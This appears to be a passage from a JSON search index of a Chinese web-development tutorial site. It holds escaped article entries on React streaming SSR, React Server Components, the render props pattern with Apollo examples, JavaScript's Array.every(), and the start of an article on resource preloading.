\u0026#34;text/pain\u0026#34; }); response.end(String((err \u0026amp;\u0026amp; err.stack) || err)); return; } }); app.use(express.static(path.resolve(__dirname, \u0026#34;src\u0026#34;))); app.use(\u0026#34;/build\u0026#34;, express.static(path.resolve(__dirname, \u0026#34;build\u0026#34;))); const listener = app.listen(process.env.PORT || 2048, () =\u0026gt; { console.log(\u0026#34;Your app is listening on port \u0026#34; + listener.address().port); }); // data.js export default [ { fact: \u0026#34;Tests done by the Behavioral Department of the Musuem of Natural History conclude that while a dog\u0026#39;s memory lasts about 5 minutes, a cat\u0026#39;s recall can last as long as 16 hours.\u0026#34;, length: 175 }, { fact: \u0026#34;Relative to its body size, the clouded leopard has the biggest canines of all animals 2019 canines. Its dagger-like teeth can be as long as 1.8 inches (4.5 cm).\u0026#34;, length: 156 } ]   下图提供了普通 SSR 与流媒体的 TTFB 和第一次有意义的绘制之间的比较。\n\r流式 SSR - 优点和缺点 Streaming 旨在通过 React 提高 SSR 的速度并提供以下好处\n 性能提升：  由于服务端开始渲染后第一个字节很快到达客户端，TTFB优于SSR。 无论页面大小如何，它也更加一致。 由于客户端一接收到 HTML 就可以开始解析，所以 FP 和 FCP 也较低。\n处理背压：  流媒体对网络背压或拥塞反应良好，即使在具有挑战性的条件下也能产生响应式网站。\n支持 SEO：流响应可以被搜索引擎爬虫读取，从而允许在网站上进行 SEO。  需要注意的是，流式实现不是从 renderToString 到 renderToNodeStream() 的简单查找替换。 在某些情况下，适用于 SSR 的代码可能无法按原样适用于流媒体。 以下是迁移可能并不容易。\n  使用 server-render-pass 生成标记的框架，这些标记需要在 SSR-ed 块之前添加到文档中。 示例是动态确定在前面的 \u0026lt;style\u0026gt; 标记中将哪些 CSS 添加到页面的框架，或在呈现时将元素添加到文档 \u0026lt;head\u0026gt; 的框架。\n  代码，其中使用 renderToStaticMarkup 生成页面模板并嵌入 renderToString 调用以生成动态内容。 由于在这些情况下需要与组件对应的字符串，因此它不能被流替换。\n  res.write(\u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\u0026#34;);\rres.write(renderToStaticMarkup(\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;My Page\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt;\r{ renderToString(\u0026lt;MyPage/\u0026gt;) }\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;); Streaming 和 Progressive Hydration 都可以帮助弥合纯 SSR 和 CSR 体验之间的差距。 现在让我们比较我们探索过的所有模式，并尝试了解它们对不同情况的适用性。\n\r知识点  hydrate ReactDOMServer.renderToString(element) ReactDOMServer.renderToNodeStream(element) renderToNodeStream(element) ReactDOM.hydrate(element, container[, callback]) renderToStaticMarkup()  ","description":"生成 HTML 以响应用户请求在服务器上呈现","id":117,"section":"react-patterns","tags":null,"title":"流(媒体)式服务器端渲染 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/streaming-ssr/"},{"content":"every() 方法测试数组中的所有元素是否通过提供的函数实现的测试。 它返回一个布尔值。\n\r使用 every 方法检查数组中的每个元素是否符合条件 every 方法用于检测数组中所有元素是否都符合指定条件。\n如果所有元素满足条件，返回布尔值 true，反之返回 false。\n举个例子，下面的代码检测数组 numbers 的所有元素是否都小于 10：\n1 2 3 4 5 6 7  const numbers = [1, 5, 8, 0, 10, 11]; numbers.every(function(currentValue) { return currentValue \u0026lt; 10; }); // false   在 checkPositive 函数中使用 every 方法检查 arr 中是否所有元素都是正数。 函数应返回一个布尔值。\n1 2 3 4 5 6 7  function checkPositive(arr) { return arr.every(val =\u0026gt; val \u0026gt; 0); } checkPositive([1, 2, 3, -4, 5]); // false   ","description":"every() 方法测试数组中的所有元素是否通过提供的函数实现的测试。 它返回一个布尔值。","id":118,"section":"javascript","tags":null,"title":"Array.prototype.every()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/every-programming/"},{"content":"React 团队正在研究零包大小的 React 服务器组件，旨在通过服务器驱动的思维模型实现现代 UX。 这与组件的服务器端渲染 (SSR) 完全不同，并且可能导致客户端 JavaScript 包显着变小。\n这项工作的方向令人兴奋，虽然尚未准备好投入生产，但值得关注。 以下资源可能会引起您的兴趣：\n  RFC 值得一读，Dan 和 Lauren 的演讲也值得一看。\n  Next.js 的 React 18 状态和 Next.js 的服务器组件路线图\n  React 18 测试版状态\n  Shopify Hydrogen 和服务器组件\n  \r服务器端渲染限制 今天的客户端 JavaScript 的服务器端呈现可能是次优的。\n组件的 JavaScript 在服务器上呈现为 HTML 字符串。此 HTML 被传送到浏览器，这可能会导致快速的“首次内容绘制”或“最大内容绘制”。\n但是，仍然需要获取 JavaScript 以实现交互性，这通常是通过水化步骤实现的。服务器端渲染通常用于初始页面加载，因此在补水后您不太可能看到它再次被使用。\n注意：虽然确实可以利用 SSR 构建一个仅限服务器的 React 应用程序并完全避免在客户端上加水，但模型中的大量交互通常涉及跳出 React。\n服务器组件启用的混合模型将允许在每个组件的基础上决定这一点。\n使用 React Server Components，我们的组件可以定期重新获取。具有可在有新数据时重新渲染的组件的应用程序可以在服务器上运行，从而限制需要向客户端发送多少代码。\n [RFC]：开发人员必须不断地选择使用第三方软件包。 使用包来呈现一些降价或格式化日期对我们作为开发人员来说很方便，但它增加了代码大小并损害了我们用户的性能\n 1 2 3 4 5 6 7 8 9  // *Before* Server Components import marked from \u0026#34;marked\u0026#34;; // 35.9K (11.2K gzipped) import sanitizeHtml from \u0026#34;sanitize-html\u0026#34;; // 206K (63.3K gzipped)  function NoteWithMarkdown({text}) { const html = sanitizeHtml(marked(text)); return (/* render */); }   \rServer Components React 的新服务器组件补充了服务器端渲染，无需添加到 JavaScript 包即可渲染为中间抽象格式。 这既允许将服务器树与客户端树合并而不会丢失状态，并且可以扩展到更多组件。\n服务器组件不能替代 SSR。 当配对在一起时，它们支持以中间格式快速渲染，然后让服务器端渲染基础设施将其渲染为 HTML，从而使早期绘制仍然很快。 我们对服务器组件发出的客户端组件进行 SSR，类似于 SSR 与其他数据获取机制的使用方式。\n然而，这一次，JavaScript 包会小很多。 早期的探索表明，bundle 大小的胜利可能很重要（-18-29%），\n但一旦进一步的基础设施工作完成，React 团队将对野外获胜有更清晰的认识。\n FC]：如果我们将上面的示例迁移到服务器组件，我们可以为我们的功能使用完全相同的代码，但避免将其发送到客户端 - 代码节省超过 240K（未压缩）：\n 1 2 3 4 5 6 7  import marked from \u0026#34;marked\u0026#34;; // zero bundle size import sanitizeHtml from \u0026#34;sanitize-html\u0026#34;; // zero bundle size  function NoteWithMarkdown({text}) { // same as before }   \r自动代码拆分 通过使用代码拆分只为用户需要的代码提供服务被认为是最佳实践。 这使您可以将您的应用程序分解为更小的包，需要将更少的代码发送到客户端。\n在服务器组件出现之前，人们会手动使用 React.lazy() 来定义“分割点”或依靠元框架的启发式设置，例如路由/页面来创建新的块。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // *Before* Server Components import React from \u0026#34;react\u0026#34;; // 其中之一将开始加载*在客户端上呈现时*： const OldPhotoRenderer = React.lazy(() =\u0026gt; import(\u0026#34;./OldPhotoRenderer.js\u0026#34;)); const NewPhotoRenderer = React.lazy(() =\u0026gt; import(\u0026#34;./NewPhotoRenderer.js\u0026#34;)); function Photo(props) { // 切换功能标签、登录/注销、内容类型等：  if (FeatureFlags.useNewPhotoRenderer) { return \u0026lt;NewPhotoRenderer {...props} /\u0026gt;; } else { return \u0026lt;PhotoRenderer {...props} /\u0026gt;; } }   代码拆分的一些挑战是：\n  在元框架（如 Next.js）之外，通常必须手动解决此优化问题，用动态导入替换导入语句。\n  当应用程序开始加载影响用户体验的组件时，它可能会延迟。\n  服务器组件引入了自动代码拆分，将客户端组件中的所有正常导入视为可能的代码拆分点。\n它们还允许开发人员更早地（在服务器上）选择要使用的组件，从而允许客户端在渲染过程中更早地获取它。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import React from \u0026#34;react\u0026#34;; // 其中之一将开始加载*一旦呈现并流式传输到客户端*： import OldPhotoRenderer from \u0026#34;./OldPhotoRenderer.client.js\u0026#34;; import NewPhotoRenderer from \u0026#34;./NewPhotoRenderer.client.js\u0026#34;; function Photo(props) { // 切换功能标签、登录/注销、内容类型等：  if (FeatureFlags.useNewPhotoRenderer) { return \u0026lt;NewPhotoRenderer {...props} /\u0026gt;; } else { return \u0026lt;PhotoRenderer {...props} /\u0026gt;; } }   \r服务器组件会取代 Next.js SSR 吗？ 不，它们完全不同。 随着研究和实验的继续，服务器组件的初始采用实际上将通过 Next.js 等元框架进行试验。\n总结一下 Dan Abramov 对 Next.js SSR 和服务器组件之间差异的一个很好的解释：\n  服务器组件的代码永远不会交付给客户端。 在许多使用 React 的 SSR 实现中，组件代码无论如何都是通过 JavaScript 包发送到客户端的。 这会延迟交互。\n  服务器组件允许从树中的任何位置访问后端。 使用 Next.js 时，您习惯于通过 getServerProps() 访问后端，它具有仅在顶级页面工作的限制。 随机 npm 组件无法做到这一点。\n  服务器组件可以在保持树内部的客户端状态的同时重新获取。 这是因为主要传输机制比 HTML 丰富得多，允许重新获取服务器呈现的部分（例如搜索结果列表）而不会破坏内部状态（例如搜索输入文本、焦点、文本选择）\n  服务器组件的一些早期集成工作将通过 webpack 插件完成：\n  定位所有客户端组件\n  创建 ID =\u0026gt; 块 URL 之间的映射\n  Node.js 加载器使用对此映射的引用替换对客户端组件的导入。\n  其中一些工作将需要更深入的集成（例如与路由之类的部分），这就是为什么让它与像 Next.js 这样的框架一起工作将是有价值的。\n  正如丹指出的那样，这项工作的目标之一是使元框架变得更好。\n\r了解更多信息并与 React 团队分享反馈 要了解有关这项工作的更多信息，请观看 Dan 和 Lauren 的演讲，\n阅读 RFC 并查看服务器组件演示以进行这项工作。 感谢 Sebastian Markbåge、Lauren Tan、Joseph Savona 和 Dan Abramov 在服务器组件方面所做的工作。\n有趣的相关主题：\n Lauren Tan on Server Components Sophie Alpert explaining them Sebastian Markbåge with a discussion on hydration HN discussion thread  \r知识点    ","description":"服务器组件补充 SSR，无需添加到 JavaScript 包即可呈现为中间抽象","id":119,"section":"react-patterns","tags":null,"title":"React 服务器组件 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/react-server-components/"},{"content":"这是历史遗留问题，所以不建议使用（现在有了Hooks），在这里只是让我们了解这段历史\n通过 props 道具将 JSX 元素传递给组件\n在高阶组件部分，我们看到如果多个组件需要访问相同的数据或包含相同的逻辑，那么能够重用组件逻辑会非常方便。\n另一种使组件非常可重用的方法是使用 render 道具模式。 render 道具是组件上的道具，其值是一个返回 JSX 元素的函数。 除了 render 道具之外，组件本身不会渲染任何东西。 相反，组件只是调用 render 道具，而不是实现自己的渲染逻辑。\n\rrender 道具 假设有一个 Title 组件。 在这种情况下，Title 组件除了渲染传递的值之外不应该做任何事情。 我们可以为此使用 render 道具！ 让我们将 Title 组件渲染的值传递给 render 道具。\n\u0026lt;Title render={() =\u0026gt; \u0026lt;h1\u0026gt;I am a render prop!\u0026lt;/h1\u0026gt;} /\u0026gt; 在 Title 组件中，可以通过返回调用的 render 道具来渲染这些数据！\nconst Title = props =\u0026gt; props.render(); 对于 Component 元素，我们必须传递一个名为 render 的道具，它是一个返回 React 元素的函数。\nimport React from \u0026#34;react\u0026#34;;\rimport { render } from \u0026#34;react-dom\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rconst Title = (props) =\u0026gt; props.render();\rrender(\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Title\rrender={() =\u0026gt; (\r\u0026lt;h1\u0026gt;\r\u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt;\r✨\r\u0026lt;/span\u0026gt;\rI am a render prop!{\u0026#34; \u0026#34;}\r\u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt;\r✨\r\u0026lt;/span\u0026gt;\r\u0026lt;/h1\u0026gt;\r)}\r/\u0026gt;\r\u0026lt;/div\u0026gt;,\rdocument.getElementById(\u0026#34;root\u0026#34;)\r); Perfect，工作顺利！ render 道具很酷的一点是，接收道具的组件是非常可重用的。\n我们可以多次使用它，每次将不同的值传递给 render 道具。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import \u0026#34;./styles.css\u0026#34;; const Title = (props) =\u0026gt; props.render(); render(//注意，这个才是本文所说的 render 道具  \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h1\u0026gt;✨ First render prop! ✨\u0026lt;/h1\u0026gt;} /\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h2\u0026gt;🔥 Second render prop! 🔥\u0026lt;/h2\u0026gt;} /\u0026gt; \u0026lt;Title render={() =\u0026gt; \u0026lt;h3\u0026gt;🚀 Third render prop! 🚀\u0026lt;/h3\u0026gt;} /\u0026gt; \u0026lt;/div\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;) );   虽然它们被称为 render 道具，但上面Title中的 render 道具不一定要被称为 render。（注意和本文所述的真正的 render 道具的区别）\n任何渲染 JSX 的道具都被视为渲染道具！ 让我们重命名上一个示例中使用的渲染道具，并为它们指定特定的名称！\nimport React from \u0026#34;react\u0026#34;;\rimport { render } from \u0026#34;react-dom\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rconst Title = (props) =\u0026gt; (\r\u0026lt;\u0026gt;\r{props.renderFirstComponent()}\r{props.renderSecondComponent()}\r{props.renderThirdComponent()}\r\u0026lt;/\u0026gt;\r);\rrender(\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Title\rrenderFirstComponent={() =\u0026gt; \u0026lt;h1\u0026gt;✨ First render prop! ✨\u0026lt;/h1\u0026gt;}\rrenderSecondComponent={() =\u0026gt; \u0026lt;h2\u0026gt;🔥 Second render prop! 🔥\u0026lt;/h2\u0026gt;}\rrenderThirdComponent={() =\u0026gt; \u0026lt;h3\u0026gt;🚀 Third render prop! 🚀\u0026lt;/h3\u0026gt;}\r/\u0026gt;\r\u0026lt;/div\u0026gt;,\rdocument.getElementById(\u0026#34;root\u0026#34;)\r); Great！ 我们刚刚看到可以使用 render 道具来使组件可重用，因为我们每次都可以将不同的数据传递给 render 道具。\n但是，为什么要使用这个？\n一个接受 render 道具的组件通常不仅仅是简单地调用 render 道具。 相反，我们通常希望将数据从接受 render 道具的组件传递到作为 render 道具传递的元素！\nfunction Component(props) {\rconst data = { ... }\rreturn props.render(data)\r} render 道具现在可以接收作为参数传递的这个值。\n\u0026lt;Component render={data =\u0026gt; \u0026lt;ChildComponent data={data} /\u0026gt;} \r案例分析 让我们看一个例子！ 有一个简单的应用程序，用户可以在其中输入摄氏温度。 该应用程序以华氏度和开尔文显示该温度的值。\nimport React, { useState } from \u0026#34;react\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rfunction Input() {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in °C\u0026#34;\r/\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;☃️ Temperature Converter 🌞\u0026lt;/h1\u0026gt;\r\u0026lt;Input /\u0026gt;\r\u0026lt;Kelvin /\u0026gt;\r\u0026lt;Fahrenheit /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction Kelvin({ value = 0 }) {\rreturn \u0026lt;div className=\u0026#34;temp\u0026#34;\u0026gt;{value + 273.15}K\u0026lt;/div\u0026gt;;\r}\rfunction Fahrenheit({ value = 0 }) {\rreturn \u0026lt;div className=\u0026#34;temp\u0026#34;\u0026gt;{(value * 9) / 5 + 32}°F\u0026lt;/div\u0026gt;;\r} 嗯.. 目前有问题。 有状态的 Input 组件包含用户输入的值，这意味着 Fahrenheit 和 Kelvin 组件无权访问用户的输入！\n- - - 吊起状态 在上面的示例中，使用户输入可用于华氏度和开尔文分量的一种方法是，解除状态。\n我们有一个有状态的 Input 组件。 但是，兄弟组件 Fahrenheit 和 Kelvin 也需要访问这些数据。 可以将状态提升到与 Input、Fahrenheit 和 Kelvin 有连接的第一个公共祖先组件，而不是有状态的 Input 组件：在这种情况下是 App 组件！\nfunction Input({ value, handleChange }) {\rreturn \u0026lt;input value={value} onChange={e =\u0026gt; handleChange(e.target.value)} /\u0026gt;;\r}\rexport default function App() {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;☃️ Temperature Converter 🌞\u0026lt;/h1\u0026gt;\r\u0026lt;Input value={value} handleChange={setValue} /\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 尽管这是一个有效的解决方案，但在具有处理许多子级的组件的大型应用程序中提升状态可能会很棘手。 每个状态更改都可能导致重新渲染所有子项，即使是那些不处理数据的子项，这可能会对您的应用程序的性能产生负面影响。\n- - - render 道具 相反，我们可以使用 render 道具！ 让我们以一种可以接收 render 道具的方式更改 Input 组件。\nfunction Input(props) {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in °C\u0026#34;\r/\u0026gt;\r{props.render(value)}\r\u0026lt;/\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;☃️ Temperature Converter 🌞\u0026lt;/h1\u0026gt;\r\u0026lt;Input\rrender={value =\u0026gt; (\r\u0026lt;\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/\u0026gt;\r)}\r/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} Perfect, Kelvin 和 Fahrenheit 现在可以访问用户输入的值！\n\r作为函数的 children 除了常规的 JSX 组件，还可以将函数作为子组件传递给 React 组件。 可以通过 children 道具使用这个功能，它在技术上也是一个 render 道具。\n让我们更改输入组件。 我们不会显式地传递 render 道具，而是将一个函数作为 Input 组件的子组件传递。\nexport default function App() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;☃️ Temperature Converter 🌞\u0026lt;/h1\u0026gt;\r\u0026lt;Input\u0026gt;\r{value =\u0026gt; (\r\u0026lt;\u0026gt;\r\u0026lt;Kelvin value={value} /\u0026gt;\r\u0026lt;Fahrenheit value={value} /\u0026gt;\r\u0026lt;/\u0026gt;\r)}\r\u0026lt;/Input\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 我们可以通过 Input 组件上可用的 props.children 属性访问这个函数。 我们将使用用户输入的值调用 props.children，而不是使用用户输入的值调用 props.render。\nfunction Input(props) {\rconst [value, setValue] = useState(\u0026#34;\u0026#34;);\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;input\rtype=\u0026#34;text\u0026#34;\rvalue={value}\ronChange={e =\u0026gt; setValue(e.target.value)}\rplaceholder=\u0026#34;Temp in °C\u0026#34;\r/\u0026gt;\r{props.children(value)}\r\u0026lt;/\u0026gt;\r);\r} 太好了，这样 Kelvin 和 Fahrenheit 组件可以访问该值，而不必担心 render 道具的名称。\n\rHooks 在某些情况下，可以用 Hooks 替换渲染道具。 Apollo Client 就是一个很好的例子。\n无需使用 Apollo Client 的经验即可理解此示例。\n使用 Apollo Client 的一种方法是通过 Mutation 和 Query 组件。\n让我们看一下高阶组件部分中介绍的相同输入示例。 现在将使用接收 render 道具的 Mutation 组件，而不是使用 graphql() 高阶组件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import InputRenderProp from \u0026#34;./InputRenderProp\u0026#34;; import InputHooks from \u0026#34;./InputHooks\u0026#34;; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Render Prop\u0026lt;/h3\u0026gt; \u0026lt;InputRenderProp /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Hooks\u0026lt;/h3\u0026gt; \u0026lt;InputHooks /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11  //resolvers.js import { gql } from \u0026#34;apollo-boost\u0026#34;; export const ADD_MESSAGE = gql` mutation AddMessage($message: String!) { addMessage(message: $message) { message } } `;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  //InputRenderProp.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { Mutation } from \u0026#34;react-apollo\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default class Input extends React.Component { constructor() { super(); this.state = { message: \u0026#34;\u0026#34; }; } handleChange = (e) =\u0026gt; { this.setState({ message: e.target.value }); }; render() { return ( \u0026lt;Mutation mutation={ADD_MESSAGE} variables={{ message: this.state.message }} onCompleted={() =\u0026gt; console.log(`Added with render prop: ${this.state.message}`) } \u0026gt; {(addMessage) =\u0026gt; ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={this.handleChange} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; )} \u0026lt;/Mutation\u0026gt; ); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  //InputHooks.js import React, { useState } from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { useMutation } from \u0026#34;@apollo/react-hooks\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default function Input() { const [message, setMessage] = useState(\u0026#34;\u0026#34;); const [addMessage] = useMutation(ADD_MESSAGE, { variables: { message }, onCompleted: () =\u0026gt; console.log(`Added with hook: ${message}`) }); return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={(e) =\u0026gt; setMessage(e.target.value)} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }   为了将数据从 Mutation 组件向下传递到需要数据的元素，我们将一个函数作为子项传递。 该函数通过其参数接收数据的值。\n\u0026lt;Mutation mutation={...} variables={...}\u0026gt;\r{addMessage =\u0026gt; \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt;...\u0026lt;/div\u0026gt;}\r\u0026lt;/Mutation\u0026gt; 尽管我们仍然可以使用 render 道具模式并且与高阶组件模式相比通常更受欢迎，但它有其缺点。\n缺点之一是组件嵌套较深。 如果一个组件需要访问多个突变或查询，我们可以嵌套多个 Mutation 或 Query 组件。\n\u0026lt;Mutation mutation={FIRST_MUTATION}\u0026gt;\r{firstMutation =\u0026gt; (\r\u0026lt;Mutation mutation={SECOND_MUTATION}\u0026gt;\r{secondMutation =\u0026gt; (\r\u0026lt;Mutation mutation={THIRD_MUTATION}\u0026gt;\r{thirdMutation =\u0026gt; (\r\u0026lt;Element\rfirstMutation={firstMutation}\rsecondMutation={secondMutation}\rthirdMutation={thirdMutation}\r/\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt;\r)}\r\u0026lt;/Mutation\u0026gt; 在 Hooks 发布后，Apollo 为 Apollo Client 库添加了 Hooks 支持。 开发人员现在可以通过库提供的钩子直接访问数据，而不是使用 Mutation 和 Query 渲染道具。\n让我们看一个示例，该示例使用与我们之前在带有 Query 渲染道具的示例中看到的完全相同的数据。 这一次，使用 Apollo Client 为我们提供的 useQuery 钩子向组件提供数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import InputHOC from \u0026#34;./InputHOC\u0026#34;; import InputHooks from \u0026#34;./InputHooks\u0026#34;; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;HOC\u0026lt;/h3\u0026gt; \u0026lt;InputHOC /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div className=\u0026#34;col\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Hooks\u0026lt;/h3\u0026gt; \u0026lt;InputHooks /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11  //resolvers.js import { gql } from \u0026#34;apollo-boost\u0026#34;; export const ADD_MESSAGE = gql` mutation AddMessage($message: String!) { addMessage(message: $message) { message } } `;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  //InputHOC.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { graphql } from \u0026#34;react-apollo\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; class Input extends React.Component { constructor() { super(); this.state = { message: \u0026#34;\u0026#34; }; } handleChange = (e) =\u0026gt; { this.setState({ message: e.target.value }); }; handleClick = () =\u0026gt; { this.props.mutate({ variables: { message: this.state.message } }); }; render() { return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={this.handleChange} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={this.handleClick}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); } } export default graphql(ADD_MESSAGE)(Input);   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  //InputHooks.js import React, { useState } from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; import { useMutation } from \u0026#34;@apollo/react-hooks\u0026#34;; import { ADD_MESSAGE } from \u0026#34;./resolvers\u0026#34;; export default function Input() { const [message, setMessage] = useState(\u0026#34;\u0026#34;); const [addMessage] = useMutation(ADD_MESSAGE, { variables: { message } }); return ( \u0026lt;div className=\u0026#34;input-row\u0026#34;\u0026gt; \u0026lt;input onChange={(e) =\u0026gt; setMessage(e.target.value)} type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type something...\u0026#34; /\u0026gt; \u0026lt;button onClick={addMessage}\u0026gt;Add\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }   通过使用 useQuery 钩子，我们减少了为组件提供数据所需的代码量。\n\r优点 使用渲染道具模式可以轻松地在多个组件之间共享逻辑和数据。通过使用 render 或 children 道具，组件可以变得非常可重用。\n虽然高阶组件模式主要解决相同的问题，即可重用性和共享数据，但渲染道具模式解决了我们使用 HOC 模式可能遇到的一些问题。\n使用 HOC 模式可能遇到的命名冲突问题不再适用于使用渲染道具模式，因为我们不会自动合并道具。\n我们使用父组件提供的值显式地将 props 传递给子组件。\n由于我们显式传递 props，我们解决了 HOC 的隐式 props 问题。应该传递给元素的道具在渲染道具的参数列表中都是可见的。\n这样，我们确切地知道某些道具来自哪里。\n我们可以通过渲染道具将应用程序的逻辑与渲染组件分开。接收渲染道具的有状态组件可以将数据传递给无状态组件，无状态组件仅渲染数据。\n\r缺点 我们试图用渲染道具解决的问题在很大程度上已被 React Hooks 取代。 随着 Hooks 改变了我们为组件添加可重用性和数据共享的方式，它们可以在许多情况下取代渲染道具模式。\n由于我们无法向 render prop 添加生命周期方法，因此我们只能在不需要更改它们接收到的数据的组件上使用它。\n\r知识点  render props children  ","description":"通过 props 道具将 JSX 元素传递给组件（这是历史遗留问题，所以不太建议使用了，因为有了Hooks，在这里只是让我们了解这段历史）","id":120,"section":"react-patterns","tags":null,"title":"render 道具模式（X）","uri":"https://codthing.github.io/react-patterns/design-patterns/render-props-pattern/"},{"content":"预加载 (\u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt;) 是一种浏览器优化，允许更早地请求关键资源（可能发现较晚）。 如果您对如何手动排序关键资源的加载感到满意，它会对 Core Web Vitals 中的加载性能和指标产生积极影响。 也就是说，预加载不是灵丹妙药，需要了解一些权衡。\n在优化交互时间或首次输入延迟等指标时，预加载可用于加载交互所需的 JavaScript 包（或块）。 请记住，在使用预加载时需要非常小心，避免以延迟首次内容绘制或最大内容绘制所需的资源（如英雄图像或字体）为代价来提高交互性。\n如果尝试优化第一块 JavaScript 的加载，还可以考虑在文档 \u0026lt;head\u0026gt; 